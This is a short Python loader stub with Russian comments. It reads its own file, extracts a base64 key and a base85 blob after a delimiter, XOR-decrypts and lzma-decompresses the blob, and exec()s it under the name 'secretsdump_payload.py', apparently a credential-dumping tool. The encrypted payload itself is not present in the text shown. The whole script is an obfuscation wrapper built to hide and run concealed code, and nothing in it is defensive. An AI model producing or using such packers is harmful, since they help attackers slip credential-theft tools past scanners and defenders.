#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64, lzma, sys, os

# Читаем самого себя
with open(__file__, 'r', encoding='utf-8') as _f:
    _self = _f.read()

# Извлекаем ключ и payload
_parts = _self.split('---DELIMITER---', 1)
if len(_parts) != 2:
    sys.exit(1)

_key_b64 = _parts[0].split('\n')[-1].strip()
_payload_section = _parts[1].strip()

# Извлекаем base85-строку из payload
_marker = 'base64.b85decode("'
_start = _payload_section.find(_marker) + len(_marker)
_end = _start + _payload_section[_start:].find('"')
_encrypted_b85 = _payload_section[_start:_end]

# Дешифрация
try:
    _key = base64.b64decode(_key_b64)
except Exception:
    sys.exit(1)

_encrypted = base64.b85decode(_encrypted_b85)

def _xor(data, key):
    out = bytearray(len(data))
    klen = len(key)
    for i in range(len(data)):
        out[i] = data[i] ^ key[i % klen]
    return bytes(out)

_compressed = _xor(_encrypted, _key)
_code = lzma.decompress(_compressed).decode('utf-8')

# Прокидываем аргументы
sys.argv = ["secretsdump_payload.py"] + sys.argv[1:]

exec(compile(_code, "secretsdump_payload.py", "exec"))

